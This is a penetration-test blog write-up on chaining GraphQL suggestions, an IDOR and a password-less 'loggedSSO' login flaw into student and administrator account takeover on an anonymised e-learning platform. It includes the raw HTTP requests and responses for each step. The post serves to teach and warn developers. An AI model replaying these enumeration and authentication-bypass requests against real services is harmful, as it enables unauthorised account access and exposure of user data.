---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-08-07_the-butterfly-effect-turning-overlooked-misconfigurations-into-zero-click-accoun.md
original_filename: 2024-08-07_the-butterfly-effect-turning-overlooked-misconfigurations-into-zero-click-accoun.md
title: 'The Butterfly Effect: Turning Overlooked - Misconfigurations into Zero Click
  Account Takeover'
category: documents
detected_topics:
- idor
- sso
- access-control
- jwt
- command-injection
- otp
tags:
- imported
- documents
- idor
- sso
- access-control
- jwt
- command-injection
- otp
language: en
raw_sha256: 3b4bb2a8ac61b904f7ffbf201cd5f001117d9becd5a29854a4e7519267d6341c
text_sha256: 8df8b44f5a07771a0a201e8020bfd7f188ba5ebf9ff86b1401e6ceb239132fab
ingested_at: '2026-06-28T07:32:37Z'
sensitivity: unknown
redactions_applied: true
---

# The Butterfly Effect: Turning Overlooked - Misconfigurations into Zero Click Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-08-07_the-butterfly-effect-turning-overlooked-misconfigurations-into-zero-click-accoun.md
- Source Type: markdown
- Detected Topics: idor, sso, access-control, jwt, command-injection, otp
- Ingested At: 2026-06-28T07:32:37Z
- Redactions Applied: True
- Raw SHA256: `3b4bb2a8ac61b904f7ffbf201cd5f001117d9becd5a29854a4e7519267d6341c`
- Text SHA256: `8df8b44f5a07771a0a201e8020bfd7f188ba5ebf9ff86b1401e6ceb239132fab`


## Content

---
title: "The Butterfly Effect: Turning Overlooked - Misconfigurations into Zero Click Account Takeover"
page_title: "The Butterfly Effect: Turning Overlooked Misconfigurations into Zero Click Account Takeover | Oussama Rahali"
url: "https://oussamarahali.com/blog/butterfly-effect-zero-click-account-takeover/"
final_url: "https://oussamarahali.com/blog/butterfly-effect-zero-click-account-takeover/"
authors: ["Oussama Rahali (@ourahali)"]
bugs: ["GraphQL", "IDOR", "Authentication bypass", "Account takeover"]
publication_date: "2024-08-07"
added_date: "2024-08-22"
source: "pentester.land/writeups.json"
original_index: 90
---

# The Butterfly Effect: Turning Overlooked Misconfigurations into Zero Click Account Takeover

August 07, 2024

![butterfly](../../assets/images/butterfly-hacker.png)

In the world of application security, even low severity misconfigurations can act as a butterfly’s wing flap, triggering a chain reaction that leads to more impactful attack scenarios. Today, I’ll take you on a journey through one such scenario, where low impact vulnerabilities snowball into a full blown zero click account takeover. Along the way, you’ll see how every overlooked detail and misconfiguration can become a stepping stone for a determined attacker. 

In a recent pentest, I was tasked with assessing a student e-learning platform. The client uses this platform to train new partners and internal employees. This test was part of the migration process from an external hosting provider to a new managed cloud environment. The client mentioned that the app was developed in-house, so I expected to find several vulnerabilities (which was the case 😛! and I finished the assessment with an RCE 💥 ). Developers often overlook low-priority or seemingly insignificant issues and misconfigurations.

## Attack Scenario

### **Understanding the environment**

While mapping the application, I discovered that it used the GraphQL API. GraphQL is a query language for APIs that allows clients to request exactly the data they need, making it both efficient and flexible. However, misconfigurations and improper implementations can introduce significant security risks.

### **Initial Discovery: GraphQL suggestions**

Our story begins with a benign-looking GraphQL API misconfiguration. At first glance, it offers nothing more than an opportunity to see GraphQL suggestions. This provided valuable insights into the available queries and mutations. Keep this in mind as it plays a crucial role in our later exploitation.

> _**GraphQL suggestions** feature provides hints about possible fields or queries you can use. While helpful for developers, leaving this feature enabled in production environments can leak information about available operations and data structures, aiding attackers in crafting more effective attacks._

### **IDOR Allowing Enumeration of Users**

After the initial reconnaissance, I discovered an Insecure Direct Object Reference (IDOR) vulnerability, which allowed me to enumerate all students and administrators of the platform via a student session.

> _**Insecure Direct Object Reference (IDOR)** is a type of access control vulnerability that occurs when an application provides direct access to objects based on user-supplied input. This can allow attackers to access unauthorized data by manipulating the input._

  * **Enumerate Students:**

  * Request:
  
  POST /graphql
  Host: foo.target.com
  Authorization: Bearer [Student JWT]
  Content-Type: application/json
  
  {
  "operationName": "student",
  "variables": {},
  "query": "query student {\n  student(id:1234) {\n  firstName\n  lastName\n  profile\n  affiliation\n  email\n  createdAt\n  __typename\n  }\n}"
  }
  

  * Response:
  
  HTTP/2 200 OK
  [..]
  
  {
  "data": {
  "student": {
  "firstName": "Alan",
  "lastName": "Turing",
  "profile": "Employee",
  "affiliation": "foobar",
  "email": "[[email protected]](/cdn-cgi/l/email-protection)",
  "createdAt": "2021-05-18T17:58:21.000Z",
  "__typename": "Student"
  }
  }
  }
  

  * **Enumerate Admins:**

  * Request:
  
  POST /graphql
  Host: foo.target.com
  Authorization: Bearer [Student JWT]
  Content-Type: application/json
  
  {
  "operationName": "Administrator",
  "variables": {
  "id": "500"
  },
  "query": "query Administrator($id: ID!) {\n  administrator(id: $id) {\n  id\n  firstName\n  lastName\n  email\n  adminLevel\n  trainerId\n  affiliation\n  proprietaire\n  team\n  favoriteCourses\n  specificAccessStartDate\n  specificAccessEndDate\n  __typename\n  }\n}"
  }
  

  * Response:
  
  HTTP/2 200 OK
  [..]
  
  {
  "data": {
  "administrator": {
  "id": "500",
  "firstName": "Linus",
  "lastName": "Torvalds",
  "email": "[[email protected]](/cdn-cgi/l/email-protection)",
  "adminLevel": 2,
  "trainerId": "Linus_Torvalds",
  "affiliation": "",
  "proprietaire": null,
  "team": null,
  "favoriteCourses": null,
  "specificAccessStartDate": null,
  "specificAccessEndDate": null,
  "__typename": "Administrator"
  }
  }
  }
  

### **How GraphQL’s Exclamation point`!` Can Mislead: When Required Fields Aren’t What They Seem**

The next breadcrumb in our trail was after analyzing the application’s JavaScript files. Within one of them, I found a mutation for logging in as a student:

![JS snipped](../../assets/JS_file_snipped.png)

At first glance, we can see that the email, password and loggedSSO variables include an exclamation point, which means that their **values cannot be null**.

> **Nullability in GraphQL:** In GraphQL, fields are nullable by default, meaning they can accept a null value unless explicitly marked otherwise. Developers can use the exclamation point (!) to designate a field as non-nullable, ensuring it must always have a value. However, this approach can be misleading. If developers mishandle nullability or make incorrect assumptions about it, they may inadvertently introduce vulnerabilities into their applications. For instance, an incorrectly handled non-nullable field might still allow a null value to pass through in certain conditions, leading to unexpected behavior or security flaws.

I tried setting the `loggedSSO` argument to `true` with one of the student emails and without setting the password. To my surprise, the server returned the access token for that student.

> **Note:** The application used SSO (Single Sign-On) for authentication. However, based on this finding, I assumed that the developers had implemented a separate function to retrieve the JWT after successfully authenticating via SSO. Yet, the implementation was misconfigured in this case, as the password value can be null (contradictory to the presence of the exclamation mark we had on the JS file earlier), leading to bypassing the password requirement and obtaining access tokens.

This vulnerability arose from the fact that while the GraphQL schema defined the `password` field as non-nullable, the backend logic did not enforce this constraint effectively. The presence of the `loggedSSO` flag bypassed the need for a password, leading to a critical authentication bypass.

Using this newfound knowledge, I crafted a request to bypass authentication for a student account.

  * Request

  
  
  POST /graphql
  Host: foo.target.tld
  Content-Type: application/json
  
  {
  "operationName": "LoginStudent",
  "variables": {
  "email": "[[email protected]](/cdn-cgi/l/email-protection)",
  "password": "",
  "loggedSSO": true
  },
  "query": "mutation LoginStudent($email: String, $uid: String, $password=***REDACTED*** $loggedSSO: Boolean!, $dataToUpdate: String) {\n  loginStudent(\n  email: $email\n  uid: $uid\n  password=***REDACTED***  loggedSSO: $loggedSSO\n  dataToUpdate: $dataToUpdate\n  )\n}"
  }
  

  * Response

  
  
  HTTP/2 200 OK
  [..]
  
  {
  "data": {
  "loginStudent": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzNCwiZW1haWwiOiJhbGFuLnR1cmluZ0BzdHVkZW50LnRsZCIsImFmZmlsaWF0aW9uIjoidGFyZ2V0IiwiaWF0IjoxNzIxMjI2OTIwLCJleHAiOjE3MjkwMDI5MjB9.rCRntgXZmuqeaAv_l0w5SvTGiXnpTS62qiboaq-o5sc"
  }
  }
  

With this token, I had control of the student’s account (this vulnerability can be combined with IDOR to increase its impact).

### **Authentication Bypass: Admin - Leveraging GraphQL Suggestions for Admin Access**

At this stage, we could take over any student accounts using only their email address, which we were able to enumerate via the IDOR vulnerability. I then wondered what would happen if I used an administrator’s e-mail address! The result was that the server returned a session token, but using this token, I was not able to access the administrator’s features.

> Further investigation led to understanding that the admin’s session token must contain an additional parameter within the JWT body, which is “adminLevel”. This parameter was also returned by the server when listing the adminstrators (see IDOR section).

I performed several attempts here, including trying to force this parameter in the request, without success.

And here’s where our initial discovery comes in handy. The breakthrough came from an error message I encountered while experimenting with the GraphQL API. When I tried to change the mutation to LoginAdmin, the GraphQL API suggestions corrected my query with new suggestions (_Cannot query field “LoginAdmin” on type “Mutation”. Did you mean “loginAdmin” or “signupAdmin” ?_):

![graphql suggestions](../../assets/graphql_suggestions.png)

This suggestion revealed the correct mutation `loginAdmin` for logging in as an admin.

With the correct mutation in hand, I used the previous mutation to bypass authentication for an admin account. and this time, the JWT returned by the server had the adminlevel parameter within the body of the token.

  * Request

  
  
  POST /graphql
  Host: foo.target.tld
  Content-Type: application/json
  
  {
  "operationName": "loginAdmin",
  "variables": {
  "email": "[[email protected]](/cdn-cgi/l/email-protection)",
  "password": "",
  "loggedSSO": true
  },
  "query": "mutation loginAdmin($email: String, $uid: String, $password=***REDACTED*** $loggedSSO: Boolean!, $dataToUpdate: String) {\n  loginAdmin(\n  email: $email\n  uid: $uid\n  password=***REDACTED***  loggedSSO: $loggedSSO\n  dataToUpdate: $dataToUpdate\n  )\n}"
  }
  

  * Response

  
  
  HTTP/2 200 OK
  [..]
  
  {
  "data": {
  "loginAdmin": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTAwLCJlbWFpbCI6ImxpbnVzLnRvcnZhbGRzQGFkbWluLnRsZCIsImFkbWluTGV2ZWwiOjIsImlhdCI6MTcyMTMwMjMyNywiZXhwIjoxNzIzODk0MzI3fQ.xd-9Jf9OlBlWAc-H_DuU-WiK1dEj1UbYwCPnPWiT8Mk"
  }
  }
  

With this token, we now have full control over the admin’s account, completing our journey from low impact vulnerabilities to a zero click account takeover.

## The End ?

In application security, no misconfiguration is less impactful to ignore. As demonstrated in this story, even the most insignificant issues such as GraphQL Suggestions or Nullability can be chained together to create a more impactful issue.

As for developers, be cautious about implementing features like GraphQL Suggestions in production, thoroughly understand the nuances of every feature, and pay close attention to details such as the use of exclamation marks (!) in GraphQL schemas.

Pentesters, always question every detail, document every misconfiguration, cross-check your findings, and keep in mind that the butterfly effect is very real.

Thanks for the read & see you in the next story :)
